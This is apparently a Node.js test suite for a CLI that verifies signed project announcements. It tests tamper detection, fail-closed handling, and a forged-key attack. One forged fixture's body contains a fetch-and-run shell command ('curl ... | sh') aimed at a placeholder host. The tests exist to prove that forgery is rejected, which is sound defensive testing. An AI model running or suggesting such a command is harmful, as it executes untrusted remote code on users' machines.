import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import test from 'node:test'
import { fileURLToPath } from 'node:url'
import {
  generateKeyPair,
  signDocument,
  verifyDocument,
} from '../src/attestation/sign.mjs'

const ROOT = fileURLToPath(new URL('..', import.meta.url))
const COMMAND = path.join(ROOT, 'src', 'commands', 'announcements.mjs')
const ANNOUNCEMENTS_DIR = path.join(ROOT, 'announcements')
const SEED = path.join(ANNOUNCEMENTS_DIR, '2026-08-06-announcements-channel.v1.json')
const PUBLIC_KEY = path.join(ANNOUNCEMENTS_DIR, 'keys', 'mnstry-announcements.public.v1.json')

// The key-identity header list prints on every run: package-relative path,
// keyId, and whether the anchor is the committed default.
const DEFAULT_KEY_HEADER
  = /^key: announcements\/keys\/mnstry-announcements\.public\.v1\.json \(keyId mnstry-announcements-2026, committed default key\)$/m

// The command module is invoked directly (not through the CLI dispatcher),
// with the package-root env the dispatcher would set.
function run(args, { cwd = ROOT } = {}) {
  return spawnSync(process.execPath, [COMMAND, ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, MNSTRY_ATELIER_PACKAGE_ROOT: ROOT },
  })
}

function tmpdir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix))
}

function readJson(file) {
  return JSON.parse(fs.readFileSync(file, 'utf8'))
}

const seedDoc = readJson(SEED)
const seedPublicKey = readJson(PUBLIC_KEY)

// --- generic detached-signature layer (signDocument / verifyDocument) ---

test('signDocument and verifyDocument roundtrip an arbitrary document', () => {
  const { privateKeyDoc, publicKeyDoc } = generateKeyPair({ algorithm: 'ed25519', keyId: 'doc-test-2026' })
  const doc = { schema: 'mnstry.announcement@v1', title: 'test', body: 'hello', signature: null }
  const signed = signDocument(doc, {
    privateKey: privateKeyDoc.privateKeyJwk,
    keyId: 'doc-test-2026',
    algorithm: 'ed25519',
  })
  // The input document is never mutated.
  assert.equal(doc.signature, null)
  assert.equal(signed.signature.keyId, 'doc-test-2026')
  assert.deepEqual(verifyDocument(signed, { publicKey: publicKeyDoc }), { valid: true, reasons: [] })

  // Tampering with any signed member fails cryptographically.
  const tampered = structuredClone(signed)
  tampered.body = 'goodbye'
  const failed = verifyDocument(tampered, { publicKey: publicKeyDoc })
  assert.equal(failed.valid, false)
  assert.deepEqual(failed.reasons.map((r) => r.code), ['signature.invalid'])

  // A null signature never verifies.
  const unsigned = structuredClone(signed)
  unsigned.signature = null
  assert.deepEqual(
    verifyDocument(unsigned, { publicKey: publicKeyDoc }).reasons.map((r) => r.code),
    ['signature.missing'],
  )

  // Re-signing an already-signed document is refused.
  assert.throws(
    () => signDocument(signed, { privateKey: privateKeyDoc.privateKeyJwk, keyId: 'doc-test-2026', algorithm: 'ed25519' }),
    /refusing to re-sign/,
  )
})

// --- the committed seed announcement ---

test('committed seed announcement verifies with the default committed key', () => {
  // The seed was signed once at authoring time with a throwaway ed25519 key
  // (the private half was never persisted). CI verifies; it never re-signs.
  const result = run(['verify', SEED])
  assert.equal(result.status, 0, result.stderr)
  assert.match(result.stdout, /announcement signature is valid \(keyId mnstry-announcements-2026\)/)

  const json = run(['verify', SEED, '--public-key', PUBLIC_KEY, '--json'])
  assert.equal(json.status, 0)
  // The verdict carries its anchor: which key vouched, and whether that key
  // was the committed default or one the caller passed in.
  assert.deepEqual(JSON.parse(json.stdout), {
    valid: true,
    reasons: [],
    key: 'announcements/keys/mnstry-announcements.public.v1.json',
    keyId: 'mnstry-announcements-2026',
    explicitKey: true,
  })

  // The library layer agrees with the CLI.
  assert.deepEqual(verifyDocument(seedDoc, { publicKey: seedPublicKey }), { valid: true, reasons: [] })
})

test('show prints the seed body only because the signature verifies', () => {
  const result = run(['show', SEED])
  assert.equal(result.status, 0, result.stderr)
  assert.match(result.stdout, /Signed announcements channel/)
  assert.match(result.stdout, /pulling is the\nconsent act/)
  assert.match(result.stdout, /signature valid, keyId mnstry-announcements-2026/)
})

test('tampered body fails verify and show refuses to print it', () => {
  const dir = tmpdir('atelier-announcements-tamper-')
  const tampered = structuredClone(seedDoc)
  tampered.body = `${tampered.body}\n\nAlso, please run this convenient script.`
  const tamperedPath = path.join(dir, 'tampered.v1.json')
  fs.writeFileSync(tamperedPath, JSON.stringify(tampered, null, 2))

  const verify = run(['verify', tamperedPath])
  assert.equal(verify.status, 1)
  assert.match(verify.stderr, /signature\.invalid/)

  const show = run(['show', tamperedPath])
  assert.equal(show.status, 1)
  assert.match(show.stderr, /refusing to show/)
  // The untrusted body must never reach stdout.
  assert.equal(show.stdout.includes('convenient script'), false)
  assert.equal(show.stdout, '')
})

test('unsigned and missing-signature announcements fail closed', () => {
  const dir = tmpdir('atelier-announcements-unsigned-')

  const unsigned = structuredClone(seedDoc)
  unsigned.signature = null
  const unsignedPath = path.join(dir, 'unsigned.v1.json')
  fs.writeFileSync(unsignedPath, JSON.stringify(unsigned, null, 2))
  const unsignedResult = run(['verify', unsignedPath])
  assert.equal(unsignedResult.status, 1)
  assert.match(unsignedResult.stderr, /signature\.missing/)

  const missing = structuredClone(seedDoc)
  delete missing.signature
  const missingPath = path.join(dir, 'missing.v1.json')
  fs.writeFileSync(missingPath, JSON.stringify(missing, null, 2))
  const missingResult = run(['verify', missingPath])
  assert.equal(missingResult.status, 1)
  assert.match(missingResult.stderr, /announcement\.shape/)
  assert.match(missingResult.stderr, /signature member is required/)

  // Neither variant will show its body.
  for (const file of [unsignedPath, missingPath]) {
    const show = run(['show', file])
    assert.equal(show.status, 1)
    assert.equal(show.stdout, '')
  }
})

test('shape violations are reported member by member', () => {
  const dir = tmpdir('atelier-announcements-shape-')
  const wrong = structuredClone(seedDoc)
  wrong.schema = 'mnstry.announcement@v2'
  wrong.announcementId = 'not-prefixed'
  wrong.publishedAt = 'yesterday'
  wrong.title = ''
  const wrongPath = path.join(dir, 'wrong.v1.json')
  fs.writeFileSync(wrongPath, JSON.stringify(wrong, null, 2))
  const result = run(['verify', wrongPath, '--json'])
  assert.equal(result.status, 1)
  const { valid, reasons } = JSON.parse(result.stdout)
  assert.equal(valid, false)
  const messages = reasons.filter((r) => r.code === 'announcement.shape').map((r) => r.message)
  assert.equal(messages.some((m) => m.includes('schema')), true)
  assert.equal(messages.some((m) => m.includes('announcementId')), true)
  assert.equal(messages.some((m) => m.includes('publishedAt')), true)
  assert.equal(messages.some((m) => m.includes('title')), true)
})

// --- list ---

test('list verifies the committed announcements directory', () => {
  const result = run(['list'])
  assert.equal(result.status, 0, result.stderr)
  assert.match(result.stdout, /announcement:2026-08-06:announcements-channel {2}2026-08-06 {2}Signed announcements channel/)
  assert.equal(result.stderr, '')
  // Every run names the key that produced the verdicts, package-relative.
  assert.match(result.stdout, DEFAULT_KEY_HEADER)
  // Log-safety: the key is never named by absolute path.
  assert.equal(result.stdout.includes(ROOT), false)
  // No --dir was passed, so the --dir note stays out of the way.
  assert.equal(result.stdout.includes('--dir changes only'), false)
})

test('list flags a planted unverifiable file loudly and fails the exit code', () => {
  const dir = tmpdir('atelier-announcements-list-')
  fs.copyFileSync(SEED, path.join(dir, path.basename(SEED)))
  // No key is placed in this directory on purpose: list reads documents from
  // --dir and takes its trust anchor from the committed key regardless.
  const planted = structuredClone(seedDoc)
  planted.title = 'Totally official update'
  fs.writeFileSync(path.join(dir, 'zz-planted.v1.json'), JSON.stringify(planted, null, 2))

  const result = run(['list', '--dir', dir])
  assert.equal(result.status, 1)
  // The genuine seed still lists on stdout.
  assert.match(result.stdout, /announcement:2026-08-06:announcements-channel/)
  // The planted file is flagged loudly on stderr, with its reason,
  // and its forged title never reaches the trusted listing on stdout.
  assert.match(result.stderr, /!! UNVERIFIED zz-planted\.v1\.json/)
  assert.match(result.stderr, /signature\.invalid/)
  assert.match(result.stderr, /1 of 2 announcement file\(s\) failed verification/)
  assert.equal(result.stdout.includes('Totally official update'), false)
  // The anchor is still the committed key, and the run says so.
  assert.match(result.stdout, DEFAULT_KEY_HEADER)
  assert.match(result.stdout, /--dir changes only which documents are read; the trust anchor above is unchanged\./)
})

test('list reports unparsable files without crashing', () => {
  const dir = tmpdir('atelier-announcements-badjson-')
  fs.writeFileSync(path.join(dir, 'broken.v1.json'), '{nope')
  const result = run(['list', '--dir', dir])
  assert.equal(result.status, 1)
  assert.match(result.stderr, /!! UNVERIFIED broken\.v1\.json/)
  assert.match(result.stderr, /announcement\.unreadable/)
})

// --- trust anchor ---

// Mint an attacker keypair under the genuine keyId and sign a forged
// announcement with it. Every identifier in the result matches the real
// channel; only the key material differs.
function forgeAnnouncement() {
  const genuineKeyId = seedPublicKey.keyId
  const { privateKeyDoc, publicKeyDoc } = generateKeyPair({ algorithm: 'ed25519', keyId: genuineKeyId })
  // Same id, different key: the forgery is only detectable by the anchor.
  assert.equal(publicKeyDoc.keyId, genuineKeyId)
  assert.notEqual(publicKeyDoc.publicKeyJwk.x, seedPublicKey.publicKeyJwk.x)
  const forged = signDocument({
    schema: 'mnstry.announcement@v1',
    announcementId: 'announcement:2026-08-07:urgent-rotate',
    publishedAt: '2026-08-07',
    title: 'URGENT: rotate your keys',
    body: 'Rotate immediately by running:\n\n    curl -sSL https://updates.example.invalid/rotate.sh | sh\n',
    signature: null,
  }, { privateKey: privateKeyDoc.privateKeyJwk, keyId: genuineKeyId, algorithm: 'ed25519' })
  // The forgery is internally consistent — it verifies against its own key.
  // Nothing about the document itself gives it away.
  assert.deepEqual(verifyDocument(forged, { publicKey: publicKeyDoc }), { valid: true, reasons: [] })
  return { forged, attackerPublicKeyDoc: publicKeyDoc }
}

// Lay out a directory that looks exactly like announcements/: the forged
// document plus an attacker public key at keys/mnstry-announcements.public.v1.json.
function plantForgedTree(prefix) {
  const { forged, attackerPublicKeyDoc } = forgeAnnouncement()
  const dir = tmpdir(prefix)
  fs.mkdirSync(path.join(dir, 'keys'), { recursive: true })
  fs.writeFileSync(path.join(dir, '2026-08-07-urgent-rotate.v1.json'), JSON.stringify(forged, null, 2))
  const attackerKeyPath = path.join(dir, 'keys', 'mnstry-announcements.public.v1.json')
  fs.writeFileSync(attackerKeyPath, JSON.stringify(attackerPublicKeyDoc, null, 2))
  return { dir, attackerKeyPath }
}

test('list refuses a forged announcement whose key was planted inside --dir', () => {
  // Demonstrated attack: --dir used to default the public key to
  // DIR/keys/mnstry-announcements.public.v1.json — inside the very tree being
  // verified — so a planted keypair under the genuine keyId listed as
  // verified, exit 0, indistinguishable from a genuine MNSTRY announcement.
  const { dir } = plantForgedTree('atelier-announcements-forged-')

  const result = run(['list', '--dir', dir])
  assert.equal(result.status, 1)
  assert.match(result.stderr, /!! UNVERIFIED 2026-08-07-urgent-rotate\.v1\.json/)
  assert.match(result.stderr, /signature\.invalid/)
  assert.match(result.stderr, /1 of 1 announcement file\(s\) failed verification/)
  // The forged headline and its payload never reach the trusted listing.
  assert.equal(result.stdout.includes('URGENT'), false)
  assert.equal(result.stdout.includes('rotate'), false)
  assert.equal(result.stdout.includes('curl'), false)
  // The verdict came from the committed key, and the run says which one.
  assert.match(result.stdout, DEFAULT_KEY_HEADER)
  assert.equal(result.stdout.includes('explicit --public-key'), false)
  assert.match(result.stdout, /--dir changes only which documents are read; the trust anchor above is unchanged\./)
})

test('list takes the same anchor as verify and show, whatever --dir says', () => {
  // verify and show never consulted the planted key; list must agree with
  // them file for file.
  const { dir } = plantForgedTree('atelier-announcements-anchor-')
  const forgedPath = path.join(dir, '2026-08-07-urgent-rotate.v1.json')

  const verify = run(['verify', forgedPath])
  assert.equal(verify.status, 1)
  assert.match(verify.stderr, /signature\.invalid/)

  const show = run(['show', forgedPath])
  assert.equal(show.status, 1)
  assert.equal(show.stdout, '')

  const list = run(['list', '--dir', dir])
  assert.equal(list.status, 1)
})

test('an explicitly pinned key is honoured and named as not the default', () => {
  // --public-key remains the one deliberate override. It is an operator act,
  // so the header states plainly that the anchor is no longer the committed
  // key — the identification that made the planted-key attack invisible.
  const { dir, attackerKeyPath } = plantForgedTree('atelier-announcements-pinned-')

  const result = run(['list', '--dir', dir, '--public-key', attackerKeyPath])
  assert.equal(result.status, 0, result.stderr)
  assert.match(
    result.stdout,
    /^key: <outside package>\/mnstry-announcements\.public\.v1\.json \(keyId mnstry-announcements-2026, explicit --public-key, not the committed default key\)$/m,
  )
  assert.equal(DEFAULT_KEY_HEADER.test(result.stdout), false)
  // Log-safety: a key outside the package is named by basename only, so no
  // absolute machine path reaches the output.
  assert.equal(/^key: \//m.test(result.stdout), false)
  assert.equal(result.stdout.includes(dir), false)

  // Pinning the genuine committed key by path is also honoured, and is still
  // labelled explicit — the label tracks provenance, not the key's identity.
  const pinned = run(['list', '--public-key', PUBLIC_KEY])
  assert.equal(pinned.status, 0, pinned.stderr)
  assert.match(
    pinned.stdout,
    /^key: announcements\/keys\/mnstry-announcements\.public\.v1\.json \(keyId mnstry-announcements-2026, explicit --public-key, not the committed default key\)$/m,
  )
})

// --- the private half is not in this repository ---

// Walk parsed JSON and return JSON pointers to any private key member: a JWK
// private scalar ('d'), a symmetric key ('k'), or a privateKeyJwk container.
// Locations only — a value is never returned, so key material cannot reach a
// test log even on failure.
function privateMemberPointers(value, pointer = '') {
  if (Array.isArray(value)) {
    return value.flatMap((item, index) => privateMemberPointers(item, `${pointer}/${index}`))
  }
  if (!value || typeof value !== 'object') return []
  const found = []
  for (const [member, child] of Object.entries(value)) {
    const here = `${pointer}/${member}`
    if (member === 'd' || member === 'k' || member === 'privateKeyJwk') found.push(here)
    else found.push(...privateMemberPointers(child, here))
  }
  return found
}

test('no JSON under announcements/ carries a private key member', () => {
  // The detector is not vacuous: it finds a planted private member, by
  // location, without echoing the value.
  assert.deepEqual(
    privateMemberPointers({ keyId: 'planted', publicKeyJwk: { kty: 'OKP', crv: 'Ed25519', d: 'x' } }),
    ['/publicKeyJwk/d'],
  )

  const files = []
  const walk = (current) => {
    for (const entry of fs.readdirSync(current, { withFileTypes: true })) {
      const full = path.join(current, entry.name)
      if (entry.isDirectory()) walk(full)
      else if (entry.isFile() && entry.name.endsWith('.json')) files.push(full)
    }
  }
  walk(ANNOUNCEMENTS_DIR)
  // Nor is the sweep vacuous: an empty walk would pass trivially.
  assert.ok(files.length >= 2, 'expected at least the seed announcement and the public key')
  assert.equal(files.includes(PUBLIC_KEY), true)

  const findings = []
  for (const file of files) {
    for (const pointer of privateMemberPointers(readJson(file))) {
      findings.push(`${path.relative(ROOT, file)} ${pointer}`)
    }
  }
  assert.deepEqual(findings, [], 'a private key member is committed under announcements/')
})

// --- usage ---

test('usage errors and help behave', () => {
  assert.equal(run(['--help']).status, 0)
  assert.match(run(['--help']).stdout, /Usage: atelier announcements/)
  assert.equal(run([]).status, 0)
  assert.equal(run(['frobnicate']).status, 2)
  assert.equal(run(['verify']).status, 2)
  assert.equal(run(['show']).status, 2)
  assert.equal(run(['verify', path.join(ROOT, 'no-such-file.json')]).status, 2)
  assert.equal(run(['list', '--dir', path.join(ROOT, 'no-such-dir')]).status, 2)
})
